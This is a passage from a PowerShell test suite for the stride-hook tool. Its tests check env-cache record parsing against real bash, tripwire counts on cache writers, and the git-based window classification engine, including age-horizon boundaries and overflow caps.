        $null = (& bash -c '. "$1" > /dev/null 2>&1' _ $g23DmCache 2>$null | Out-String)
        Assert-Eq "23j [$($leg.Name)]: and sourcing the cache executes nothing" "False" `
            "$(Test-Path $g23DmMarker)"
        Remove-Item -Force $g23DmMarker -ErrorAction SilentlyContinue
    }
} else {
    Write-Host "  SKIP: 23j: the dismemberment test needs git and bash" -ForegroundColor Yellow
}

# --- 23k: the record scanner agrees with bash about where records END ---
# Split-EnvCacheRecord is the thing every filter now trusts, so it is checked
# against bash itself rather than against our idea of sh. Each probe seeds a
# cache, asks the ps1 scanner how many records it sees, and asks a real bash
# what the file actually assigns. The two must tell the same story.
#
# The trailing-backslash case is here because the first version got it wrong:
# `A=x\` followed by `B='y'` is ONE assignment to bash (the backslash escapes
# the newline), and a scanner that called them two records could drop the first
# and leave the second standing alone, changing what the file means.
if ($g23Bash) {
    $g23ScDir = Join-Path $TmpDir 'g23-scanner'
    New-Item -ItemType Directory -Path $g23ScDir -Force | Out-Null
    $g23ScCache = Join-Path $g23ScDir '.stride-env-cache'
    $g23ScQ = [char]39
    foreach ($probe in @(
        @{ Name = 'trailing backslash is a continuation'; Body = "A=x\`nB='y'`n";        Records = 1; A = 'xB=y' },
        @{ Name = 'backslash inside quotes is literal';   Body = "A='x\'`nB='y'`n";      Records = 2; A = 'x\' },
        @{ Name = 'the escaped-quote form stays one';     Body = "A='a'\''b'`nB='y'`n";  Records = 2; A = "a$($g23ScQ)b" },
        @{ Name = 'a value ending in a quote';            Body = "A='a'\'''`nB='y'`n";   Records = 2; A = "a$g23ScQ" },
        @{ Name = 'two unterminated opens are ONE';       Body = "A='x`nB='y`n";         Records = 1; A = "x`nB=y" },
        @{ Name = 'a genuinely multi-line value';         Body = "A='1`n2`n3'`nB='y'`n"; Records = 2; A = "1`n2`n3" }
    )) {
        [System.IO.File]::WriteAllText($g23ScCache, $probe.Body, (New-Object System.Text.UTF8Encoding($false)))
        # The ps1 scanner, extracted from the shipped file by the group-22 harness.
        $script:EnvCache = $g23ScCache
        $g23ScRes = Split-EnvCacheRecord
        Assert-Eq "23k: $($probe.Name) - record count" "$($probe.Records)" `
            "$(@($g23ScRes.Records).Count)"
        # bash's own answer for the same bytes.
        $g23ScA = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "${A:-<unset>}"' _ $g23ScCache 2>$null | Out-String).TrimEnd("`r", "`n")
        Assert-Eq "23k: $($probe.Name) - bash agrees on the value" $probe.A $g23ScA
    }
    # And the fail-closed case: a file ending inside a quoted run is refused
    # outright rather than guessed at, so every caller leaves the cache alone.
    [System.IO.File]::WriteAllText($g23ScCache, "A='x`n", (New-Object System.Text.UTF8Encoding($false)))
    $script:EnvCache = $g23ScCache
    Assert-Eq "23k: a cache ending inside a quoted value is REFUSED, not guessed" "False" `
        "$((Split-EnvCacheRecord).Ok)"
} else {
    Write-Host "  SKIP: 23k: the scanner-vs-bash comparison needs bash" -ForegroundColor Yellow
}

# --- 23e: a ps1-written cache is readable by bash's STRICT record grep ---
# Acceptance criterion 4. Sourcing is the lenient reader; read_task_record is
# the strict one, and it demands the exact ^KEY='[^']*'$ shape. A cache this
# port writes has to satisfy both, or the two executors disagree about what a
# record is.
if ($g23Bash) {
    $g23Sh = Join-Path $ScriptDir 'stride-hook.sh'
    $g23StrictDir = Join-Path $TmpDir 'g23-strict'
    New-Item -ItemType Directory -Path $g23StrictDir -Force | Out-Null
    $g23StrictCache = Join-Path $g23StrictDir '.stride-env-cache'
    [System.IO.File]::WriteAllText($g23StrictCache,
        "TASK_BASE_REF_42=" + (ConvertTo-ShSingleQuoted -Value 'cafebabe1234') + "`n" +
        "TASK_BASE_REF_TRUSTED=" + (ConvertTo-ShSingleQuoted -Value '1') + "`n",
        (New-Object System.Text.UTF8Encoding($false)))
    $g23Strict = (& bash -c '. "$1" > /dev/null 2>&1; ENV_CACHE="$2" read_task_record TASK_BASE_REF_42' _ $g23Sh $g23StrictCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "23e: bash's strict read_task_record accepts a ps1-written line" "cafebabe1234" $g23Strict
} else {
    Write-Host "  SKIP: 23e: the strict-grep leg needs bash" -ForegroundColor Yellow
}

# --- 23f: the completeness tripwire ---
# The defect IS the existence of an unescaped writer, so completeness is the
# property under test and a count is the only way to keep it true. Write-EnvCache
# is the single choke point every cache write goes through (verified: it holds
# the only file-mutating call against $EnvCache). If a NEW call site appears,
# this fires - go read it and confirm its values are escaped, then bump the
# count. Do not bump it without reading the new site.
$g23CodeLines = @(Get-Content -Path $HookScript | Where-Object { $_.TrimStart() -notlike '#*' })
# Match ANY invocation, not `Write-EnvCache\s+-Lines`. The parameter is
# [string[]]$Lines and binds POSITIONALLY, so a seventh writer spelled
# `Write-EnvCache $newLines` would have left the old count at 6 and the tripwire
# green — while completeness is the exact property this test exists to hold.
# Subtract the one definition line rather than filtering it, so a renamed or
# re-signatured definition also trips this rather than silently rebasing it.
$g23WriteRefs = @($g23CodeLines | Where-Object { $_ -match 'Write-EnvCache' }).Count
$g23WriteDefs = @($g23CodeLines | Where-Object { $_ -match 'function\s+Write-EnvCache' }).Count
Assert-Eq "23f: Write-EnvCache is defined exactly once" "1" "$g23WriteDefs"
# (D289) The count moved from 6 to 1, and the tripwire got STRONGER rather than
# weaker. Every rewrite now goes through Invoke-EnvCacheRewrite, which owns the
# compare-and-swap retry, so Write-EnvCache has exactly ONE caller: the helper
# itself. Any new DIRECT call is therefore a writer that skipped the guard, and
# this fires on the first one instead of on the seventh. Do not bump this to 2
# to make a new direct writer pass - route the writer through the helper, or
# read the site and record at it why it cannot be.
Assert-Eq "23f: Write-EnvCache has exactly 1 call site - the guard (tripwire on unguarded writers)" "1" `
    "$($g23WriteRefs - $g23WriteDefs)"
# The completeness property the count above used to carry now lives here: these
# are the rewrites, and a new one has to appear in this count. Same rule - go
# read the new site and confirm its values are escaped before bumping.
$g23CasRefs = @($g23CodeLines | Where-Object { $_ -match 'Invoke-EnvCacheRewrite' }).Count
$g23CasDefs = @($g23CodeLines | Where-Object { $_ -match 'function\s+Invoke-EnvCacheRewrite' }).Count
Assert-Eq "23f: Invoke-EnvCacheRewrite is defined exactly once" "1" "$g23CasDefs"
Assert-Eq "23f: Invoke-EnvCacheRewrite still has exactly 5 call sites (tripwire on new writers)" "5" `
    "$($g23CasRefs - $g23CasDefs)"

}

# ============================================================
# Test Group 24: W2102 — the window classification engine
# ============================================================
# Mirrors sh Test Group 23 (D226 base isolation, test-stride-hook.sh:6199-8420).
# MIRRORED BY GROUP TITLE AND DEFECT ID, NEVER BY CASE NUMBER — the two suites'
# group numbering diverges from sh Group 7 onward, so sh 23 and ps1 22 are
# unrelated and matching by number would pair the wrong assertions.
#
# OMITTED FROM THIS MIRROR, AND WHY (acceptance criterion 3 permits omissions
# when the reason is recorded; an omission with a named blocker is a plan, one
# without a reason is a gap):
#   sh 23e/23e1/23e1b/23e2/23e4  D268/D274 window eviction
#       NO LONGER OMITTED - W2103 ported the eviction and mirrored these in
#       Group 25 (25a-25i). Kept in this list, corrected rather than deleted,
#       so the reason a reader once found here does not simply vanish.
#   sh 23z12-23z14, 23z16, 23z19-23z21  D273 self-heal replay
#       NO LONGER OMITTED - W2103 added the base=/narrowed= persistence these
#       were blocked on, and Group 25's 25j/25k pin the replay.
#   sh 23m/23m1/23m2  D258 hook-env fencing
#       COVERED ELSEWHERE at test-stride-hook.ps1:2037-2079.
#   sh 23z15c  non-integer id refusal
#       COVERED ELSEWHERE by 22b, 22c and :2791-2849.
#   `refused_base=yes` on the refusal path  (sh 2410, 2756)
#       DELIBERATELY UNPORTED. bash appends it after the truncating state write
#       at BOTH sites; Write-DiffUploadState has no equivalent and never has.
#       Nothing in either executor or either suite reads it - it is a
#       breadcrumb for a human reading the state file - so this is a diagnostic
#       gap, not a behavioural one. Recorded here rather than left to be
#       re-derived; whoever ports it should do both sites at once.
#   sh 23j, 23n, 23o, 23p (both levels), 23q, 23v  D236/D255 fallback world
#       NOT MIRRORED, and recorded here because the Group 26 banner names these
#       same cases while the ledger did not - two records of what this suite
#       covers should not disagree. They are the collateral the D272 trade
#       breaks: measured, the declined fix costs bash nine assertions across
#       them and this suite zero, because none has a counterpart. That gap is
#       the honest reason the ps1 measurement cannot stand in for bash's.
#   sh 23z4, sh 23z5  D271 end-to-end (swept untracked stray; empty owned set)
#       NOT MIRRORED. 23z3's payoff is covered incidentally by 26i, which has
#       the same geometry - incidentally, not deliberately, which is why it is
#       recorded rather than claimed.
#   sh 23v2  D272 ratchet
#       NO LONGER OMITTED. All SIX sub-blocks are mirrored in Group 26: k=2
#       (sh :8276 -> 26a), the terminal k=3 (:8300 -> 26b), the empty-window
#       edge (:8326 -> 26c), the real-commit-child edge (:8345 -> 26e), the
#       depth-3 grandchild (:8371 -> 26f) and the uncommitted-WIP
#       observability case (:8399 -> 26g).
#       TWO FALSE CLAIMS PRECEDED THIS ONE, and both are recorded rather than
#       quietly replaced. W2102 deferred these "because the k=2 sub-block below
#       pins that this port REPRODUCES the ratchet", and no k=2 sub-block
#       existed - nor any other D272 assertion in this suite. W2104's first
#       correction then said the remainder was "k=4..k=8 ... the same shape at
#       greater depth"; sh 23v2 has no k=4..k=8, and the three that were still
#       unmirrored were distinct victim and observability classes, two of which
#       this task's own testing_strategy named. A ledger that describes away
#       what it omits is worse than one that omits loudly.
Write-Host ""
Write-Host "=== Test Group 24: W2102 window classification engine ==="

$g24Want = @(
    'Get-OwnedCommitSet', 'Convert-OwnedSetToRange', 'Get-OpenWindowMaxAgeSecs',
    'Test-AnotherOpenWindowExists', 'Get-AttributedCommitRange',
    'Get-EnvCacheLine', 'Split-EnvCacheRecord', 'Read-TaskRecord',
    'ConvertFrom-ShSingleQuoted', 'ConvertTo-ShSingleQuoted', 'Get-TaskRecordKey',
    'Get-TaskBaseRefKey', 'Get-TaskHeadRefKey', 'Get-TaskOwnedKey', 'Get-TaskBaseAtKey',
    'Get-TaskOwnedRecord', 'Get-TaskBaseAtRecord', 'Get-TaskHeadRefFor', 'Get-TaskBaseRefFor'
)
$g24Ast = [System.Management.Automation.Language.Parser]::ParseFile($HookScript, [ref]$null, [ref]$null)
$g24Found = @()
foreach ($f in $g24Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)) {
    if ($g24Want -contains $f.Name) {
        $g24Found += $f.Name
        . ([scriptblock]::Create($f.Extent.Text))
    }
}
# The engine functions read script-scope SENTINELS, and extracting functions
# alone leaves those unset — Set-StrictMode then throws on first read. Take the
# assignments from the shipped file too, rather than restating the values here:
# a local copy would keep passing after the real constant changed, which is the
# same vacuity the function extraction exists to avoid.
$g24WantVar = @('StrideOwnedOverflow', 'StrideNoOwnCommits')
$g24FoundVar = @()
foreach ($a in $g24Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst] }, $true)) {
    $lhs = $a.Left.Extent.Text
    foreach ($vn in $g24WantVar) {
        if ($lhs -eq ('$script:' + $vn)) {
            $g24FoundVar += $vn
            . ([scriptblock]::Create($a.Extent.Text))
        }
    }
}
$g24MissingVar = @($g24WantVar | Where-Object { $g24FoundVar -notcontains $_ })
if ($g24MissingVar.Count -gt 0) {
    Write-Host "  FAIL: 24-harness: could not extract sentinels: $($g24MissingVar -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 24-harness: both engine sentinels extracted from the real hook" -ForegroundColor Green
    $script:PASS++
}
$g24Missing = @($g24Want | Where-Object { $g24Found -notcontains $_ })
if ($g24Missing.Count -gt 0) {
    Write-Host "  FAIL: 24-harness: could not extract from stride-hook.ps1: $($g24Missing -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 24-harness: all $($g24Want.Count) engine functions extracted from the real hook" -ForegroundColor Green
    $script:PASS++

$g24Git = Get-Command git -ErrorAction SilentlyContinue
# The extracted engine functions read $ProjectDir, so these cases must point it
# at their own fixture repos. Save and restore it - Group 25 now follows this
# one, and without the restore it would inherit a stale project dir and fail for
# a reason that has nothing to do with it. (That is no longer hypothetical: this
# comment used to say "Group 24 is last today".)
$g24SavedProjectDir = $ProjectDir

# Build a repo with N sequential commits and return its SHAs, newest first.
function New-G24Repo {
    param([string]$Name, [int]$Commits = 3)
    $d = Join-Path $TmpDir "g24-$Name"
    Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Path $d -Force | Out-Null
    & git -C $d init -q 2>$null | Out-Null
    & git -C $d config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $d config user.name 'Test' 2>$null | Out-Null
    & git -C $d config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $d 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $d add -A 2>$null | Out-Null
    & git -C $d commit -q -m 'seed' 2>$null | Out-Null
    for ($i = 1; $i -le $Commits; $i++) {
        Set-Content -Path (Join-Path $d "f$i.txt") -Value "v$i" -Encoding UTF8
        & git -C $d add -A 2>$null | Out-Null
        & git -C $d commit -q -m "c$i" 2>$null | Out-Null
    }
    return $d
}

# --- 24a: Get-OwnedCommitSet (sh 23z / D255) ---
if ($g24Git) {
    $g24aDir = New-G24Repo -Name 'ownedset' -Commits 3
    $ProjectDir = $g24aDir
    $g24aAll = @(& git -C $g24aDir rev-list HEAD 2>$null | Where-Object { $_ })
    $g24aHead = $g24aAll[0]
    $g24aRoot = $g24aAll[$g24aAll.Count - 1]
    # These two guards are belt-and-braces: git resolves '..sha' and 'a..a' to an
    # empty rev-list anyway, so deleting them still passes. Assert them against
    # an endpoint git would REJECT rather than resolve, so the guard is what
    # produces the answer rather than git's tolerance.
    Assert-Eq "24a: missing endpoints yield the empty record" "" (Get-OwnedCommitSet -H0 '' -H1 $g24aHead)
    Assert-Eq "24a: a missing H1 yields the empty record even for a valid H0" "" `
        (Get-OwnedCommitSet -H0 $g24aHead -H1 '')
    Assert-Eq "24a: identical endpoints yield the empty record, not a SHA" "" `
        (Get-OwnedCommitSet -H0 $g24aHead -H1 $g24aHead)
    # An UNRESOLVABLE endpoint must degrade to the empty record rather than
    # throwing or emitting git's error text as if it were a SHA list.
    Assert-Eq "24a: an unresolvable endpoint yields the empty record" "" `
        (Get-OwnedCommitSet -H0 'deadbeefcafedeadbeefcafedeadbeefcafedead' -H1 $g24aHead)
    $g24aSet = Get-OwnedCommitSet -H0 $g24aRoot -H1 $g24aHead
    Assert-Eq "24a: a normal delta returns every commit in the span" "3" `
        "$(@($g24aSet -split ' ' | Where-Object { $_ }).Count)"
    # NEWEST FIRST is load-bearing: Convert-OwnedSetToRange reads the LAST
    # token as the oldest. Reversed, the range comes out backwards, git
    # resolves it to nothing, and the under-report looks like a correct narrow.
    Assert-Eq "24a: and in rev-list order, NEWEST first" $g24aHead `
        "$(@($g24aSet -split ' ')[0])"
} else {
    Write-Host "  SKIP: 24a: the owned-set cases need git" -ForegroundColor Yellow
}

# --- 24a2: the 20-commit cap yields OVERFLOW, never a truncated list ---
# A truncated list would be WORSE than no list: the classifier treats a
# non-empty owned record as naming the window's commits exactly, so a partial
# one would mis-subtract and lose the unlisted commits from their author.
if ($g24Git) {
    $g24bDir = New-G24Repo -Name 'overflow' -Commits 21
    $ProjectDir = $g24bDir
    $g24bAll = @(& git -C $g24bDir rev-list HEAD 2>$null | Where-Object { $_ })
    $g24bSet = Get-OwnedCommitSet -H0 $g24bAll[$g24bAll.Count - 1] -H1 $g24bAll[0]
    Assert-Eq "24a2: 21 commits yields the OVERFLOW sentinel" "OVERFLOW" $g24bSet
    Assert-Eq "24a2: and never a truncated SHA list" "False" "$($g24bSet -match '[0-9a-f]{40}')"
    # EXACTLY 20 is under the cap and must return the list. Without this row,
    # flipping the cap from -gt 20 to -ge 20 passes the whole suite - the
    # boundary is the only thing that distinguishes the two.
    $g24bAt20 = Get-OwnedCommitSet -H0 $g24bAll[20] -H1 $g24bAll[0]
    Assert-Eq "24a2: exactly 20 commits is UNDER the cap and returns the list" "20" `
        "$(@($g24bAt20 -split ' ' | Where-Object { $_ }).Count)"
} else {
    Write-Host "  SKIP: 24a2: the overflow case needs git" -ForegroundColor Yellow
}

# --- 24b: Convert-OwnedSetToRange (sh 23z / D255) ---
if ($g24Git) {
    $g24cDir = New-G24Repo -Name 'range' -Commits 3
    $ProjectDir = $g24cDir
    $g24cAll = @(& git -C $g24cDir rev-list HEAD 2>$null | Where-Object { $_ })
    Assert-Eq "24b: an empty set yields no range" "" (Convert-OwnedSetToRange -Set '')
    Assert-Eq "24b: OVERFLOW yields no range" "" (Convert-OwnedSetToRange -Set 'OVERFLOW')
    # Newest-first input: [0]=newest, [last]=oldest. The range is <oldest>^ <newest>.
    $g24cSet = ($g24cAll[0] + ' ' + $g24cAll[1] + ' ' + $g24cAll[2])
    Assert-Eq "24b: a multi-SHA set yields <oldest>^ <newest>, in that order" `
        ($g24cAll[2] + '^ ' + $g24cAll[0]) (Convert-OwnedSetToRange -Set $g24cSet)
    Assert-Eq "24b: a single-SHA set yields <it>^ <it>" `
        ($g24cAll[0] + '^ ' + $g24cAll[0]) (Convert-OwnedSetToRange -Set $g24cAll[0])
    # A root commit has no parent, so ^ does not resolve. Matching nothing
    # over-reports, which is the documented safer failure.
    $g24cRoot = $g24cAll[$g24cAll.Count - 1]
    Assert-Eq "24b: a root commit yields no range rather than an unresolvable one" "" `
        (Convert-OwnedSetToRange -Set $g24cRoot)
} else {
    Write-Host "  SKIP: 24b: the range cases need git" -ForegroundColor Yellow
}

# --- 24c: Get-OpenWindowMaxAgeSecs (sh 23z11 / D273) ---
# Every invalid shape falls back to the default rather than disabling the
# check - that is the one direction this must never fail in, because a
# disabled age check silently brings the narrowing back.
$g24cOld = [System.Environment]::GetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', 'Process')
[System.Environment]::SetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', $null, 'Process')
Assert-Eq "24c: absent override yields the 14400 default" "14400" (Get-OpenWindowMaxAgeSecs)
[System.Environment]::SetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', '900', 'Process')
Assert-Eq "24c: a valid override is honoured" "900" (Get-OpenWindowMaxAgeSecs)
[System.Environment]::SetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', '90x', 'Process')
Assert-Eq "24c: a non-numeric override falls back, never disables" "14400" (Get-OpenWindowMaxAgeSecs)
[System.Environment]::SetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', '99999999999', 'Process')
Assert-Eq "24c: an 11-digit override falls back on WIDTH, matching bash" "14400" (Get-OpenWindowMaxAgeSecs)
[System.Environment]::SetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', $g24cOld, 'Process')

# --- 24d: Test-AnotherOpenWindowExists, the D271/D273 gate ---
# Every validation failure must take the WIDE path (answer "no open window"),
# because vouching for a record this predicate cannot age is the one direction
# D271 forbids.
if ($g24Git) {
    $g24dDir = New-G24Repo -Name 'openwin' -Commits 2
    $ProjectDir = $g24dDir
    $script:EnvCache = Join-Path $g24dDir '.stride-env-cache'
    $g24dHead = (& git -C $g24dDir rev-parse HEAD 2>$null | Out-String).Trim()
    # THE WRITER'S EPOCH EXPRESSION, deliberately - not Get-Date -UFormat %s.
    # Two reasons, and the second is the one that matters. (a) -UFormat rounds
    # UP, so a stamp built with it lands a second in the FUTURE relative to the
    # reader and is correctly dropped by the negative-age guard, making the
    # fixture flaky. (b) More importantly, a fixture that builds the stamp with
    # the same expression the reader uses can never detect the two disagreeing -
    # which is exactly the bug a security review found here: the reader used
    # -UFormat %s (LOCAL time on Windows PowerShell 5.1, the shipping host)
    # against a stamp written from UtcNow, so the whole gate was silently inert
    # off-UTC. Building the stamp the way the WRITER does compares the two.
    $g24dEpochStart = New-Object DateTime 1970, 1, 1, 0, 0, 0, ([DateTimeKind]::Utc)
    $g24dNow = [string][int64][math]::Floor(([DateTime]::UtcNow - $g24dEpochStart).TotalSeconds)
    $g24dOldStamp = [string]([int64]$g24dNow - 99999)

    # A window with a HEAD partner is CLOSED and vouches for nothing.
    #
    # THE HEAD GOES IN THE ENV, NOT THE FILE, and that is the point rather than
    # a fixture quirk: this predicate reads bases from the file and heads from
    # the ENV, exactly as bash splits them. In a real run the bulk loader puts
    # the cache into the environment first. A fixture that seeded the head only
    # on disk would find every window open and pass the OPEN cases vacuously.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$g24dNow'")
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $g24dHead, 'Process')
    Assert-Eq "24d: a CLOSED window (head present) does not count as open" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $null, 'Process')

    # Open, fresh stamp, resolvable ancestor base -> counts.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$g24dNow'")
    Assert-Eq "24d: an OPEN window with a fresh stamp counts" "True" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # SELF is excluded - a task's own window never vouches for itself.
    Assert-Eq "24d: the completing task's OWN window is excluded as self" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '77')"

    # A MISSING stamp reads DEAD, deliberately: every window opened by a hook
    # carrying this change is stamped, so an unstamped record was written by an
    # older version and is by construction from an earlier session.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @("TASK_BASE_REF_77='$g24dHead'")
    Assert-Eq "24d: a window with NO stamp reads dead" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # Aged past the horizon -> dead. Exactly AT the horizon -> live (strict -gt).
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$g24dOldStamp'")
    Assert-Eq "24d: a window aged past the horizon reads dead" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # A stamp AHEAD of the clock is a NEGATIVE age, which trivially passes a
    # -gt test - so a future-stamped window would vouch as live forever, the
    # exact record this check exists to retire. Reachable without tampering.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$([string]([int64]$g24dNow + 99999))'")
    Assert-Eq "24d: a stamp AHEAD of the clock reads dead, not live" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # A base that does not resolve vouches for nothing.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='deadbeefcafedeadbeefcafedeadbeefcafedead'",
        "TASK_BASE_AT_77='$g24dNow'")
    Assert-Eq "24d: an unresolvable base vouches for nothing" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # A NON-INTEGER id is refused by the D269 guard at the key builder, so its
    # record cannot vouch either - the engine routes THROUGH that guard rather
    # than around it.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_10_0='$g24dHead'",
        "TASK_BASE_AT_10_0='$g24dNow'")
    Assert-Eq "24d: a record under a non-integer id vouches for nothing" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"
    # 24d2: the reader's clock and the WRITER's stamp must agree. The stamp is
    # built exactly as Invoke-FinalizeBeforeDoing builds it, and a window
    # stamped "now" must read LIVE. If the two expressions ever diverge again -
    # a local-vs-UTC mismatch being the reproduced case - this fails, where a
    # fixture sharing the reader's expression would stay green.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$g24dNow'")
    Assert-Eq "24d2: a window stamped by the WRITER's clock reads live to the reader" "True" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"
    # And one second inside the horizon is still live, so the comparison is not
    # merely passing on a coincidence of rounding.
    # Re-read the clock for each boundary row, for the reason given below.
    $g24dNowA = [int64][math]::Floor(([DateTime]::UtcNow - $g24dEpochStart).TotalSeconds)
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$([string]($g24dNowA - 14390))'")
    Assert-Eq "24d2: inside the horizon is live" "True" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"
    $g24dNowC = [int64][math]::Floor(([DateTime]::UtcNow - $g24dEpochStart).TotalSeconds)
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$([string]($g24dNowC - 14401))'")
    Assert-Eq "24d2: one second outside the horizon is dead" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"
    # EXACTLY AT the horizon is LIVE - bash uses a strict -gt, and without this
    # row flipping the comparison to -ge passes the whole suite. sh 23z17 pins
    # the same boundary.
    #
    # THE CLOCK IS RE-READ HERE, not reused from the top of 24d. A stamp built
    # from a clock captured many assertions earlier is already older than the
    # horizon by the time this runs, so the row failed intermittently on
    # elapsed test time rather than on the comparison it exists to pin - which
    # is a flake, and a flake on a boundary row is worse than no row at all
    # because it teaches the reader to ignore it.
    # A SETTLE LOOP, because an exact-boundary assertion against a LIVE clock
    # cannot be made deterministic by shrinking the window. The fixture's
    # floor() and the predicate's own floor() are independent reads, so whenever
    # a whole-second boundary falls between them the age becomes 14401 and the
    # row fails for a reason that has nothing to do with the comparison. My
    # first de-flake shrank that window from seconds to milliseconds and left
    # the flake in place; this removes it.
    #
    # The loop is a real discriminator, not a tolerance: with the strict -gt an
    # attempt succeeds unless a second ticked mid-attempt, so five attempts
    # effectively always pass; with -ge, age == horizon is DEAD on EVERY
    # attempt, so all five fail and the row fails. The mutation stays caught.
    $g24dAtHorizon = $false
    for ($g24dTry = 0; $g24dTry -lt 5 -and -not $g24dAtHorizon; $g24dTry++) {
        $g24dNowB = [int64][math]::Floor(([DateTime]::UtcNow - $g24dEpochStart).TotalSeconds)
        Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
            "TASK_BASE_REF_77='$g24dHead'",
            "TASK_BASE_AT_77='$([string]($g24dNowB - 14400))'")
        $g24dAtHorizon = [bool](Test-AnotherOpenWindowExists -SelfTaskId '42')
    }
    Assert-Eq "24d2: EXACTLY at the horizon is live (strict -gt, as bash)" "True" "$g24dAtHorizon"

    # A stamp WIDER than ten digits falls back rather than being trusted. bash
    # bounds the width because a value past 2^63 wraps and makes a dead record
    # read LIVE - the under-report direction. PowerShell does not wrap the same
    # way, but the two executors must skip the SAME records or a shared
    # checkout narrows on one host and not the other.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='99999999999'")
    Assert-Eq "24d2: an 11-digit stamp is refused, not trusted" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # A base that resolves but is NOT an ancestor of HEAD vouches for nothing.
    # Without this row, deleting the merge-base --is-ancestor call passes the
    # whole suite. Built on a divergent branch so the commit is real and
    # resolvable yet unreachable from HEAD.
    $null = & git -C $g24dDir checkout -q -b g24-side 2>$null
    Set-Content -Path (Join-Path $g24dDir 'side.txt') -Value 'side' -Encoding UTF8
    $null = & git -C $g24dDir add -A 2>$null
    $null = & git -C $g24dDir commit -q -m 'side' 2>$null
    $g24dSide = (& git -C $g24dDir rev-parse HEAD 2>$null | Out-String).Trim()
    $null = & git -C $g24dDir checkout -q - 2>$null
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dSide'",
        "TASK_BASE_AT_77='$g24dNow'")
    Assert-Eq "24d2: a resolvable base that is NOT an ancestor of HEAD vouches for nothing" "False" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"

    # POSITIVE CONTROL for the whole of 24d. Every negative assertion above is
    # satisfied by this predicate returning False for ANY reason - an empty
    # head SHA, an unreadable cache, a failed clock read and a genuine correct
    # verdict are indistinguishable without it. Assert the fixture is sane and
    # that the same cache shape the negatives use still reads LIVE when it
    # should, so a wholesale False cannot masquerade as seven passes.
    Assert-Eq "24d2: CONTROL - the fixture's head SHA is a real 40-char object" "True" `
        "$($g24dHead -match '^[0-9a-f]{40}\z')"
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_77='$g24dHead'",
        "TASK_BASE_AT_77='$g24dNow'")
    Assert-Eq "24d2: CONTROL - the same fixture shape still reads LIVE" "True" `
        "$(Test-AnotherOpenWindowExists -SelfTaskId '42')"
} else {
    Write-Host "  SKIP: 24d: the open-window gate needs git" -ForegroundColor Yellow
}

# --- 24e: Get-AttributedCommitRange, the D236/D244/D256 classifier ---
if ($g24Git) {
    $g24eDir = New-G24Repo -Name 'attrib' -Commits 4
    $ProjectDir = $g24eDir
    $script:EnvCache = Join-Path $g24eDir '.stride-env-cache'
    $g24eAll = @(& git -C $g24eDir rev-list HEAD 2>$null | Where-Object { $_ })
    # newest .. oldest: [0]=c4 [1]=c3 [2]=c2 [3]=c1 [4]=seed
    $g24eBase = $g24eAll[4]

    Assert-Eq "24e: an empty base yields no ranges" "" (Get-AttributedCommitRange -OwnBase '' -SelfTaskId '42')
    # No windows recorded at all -> '' (the caller keeps its ordinary path).
    # This must NOT be the no-own-commits sentinel: collapsing the two is the
    # D236 outer-absorbs-its-children bug.
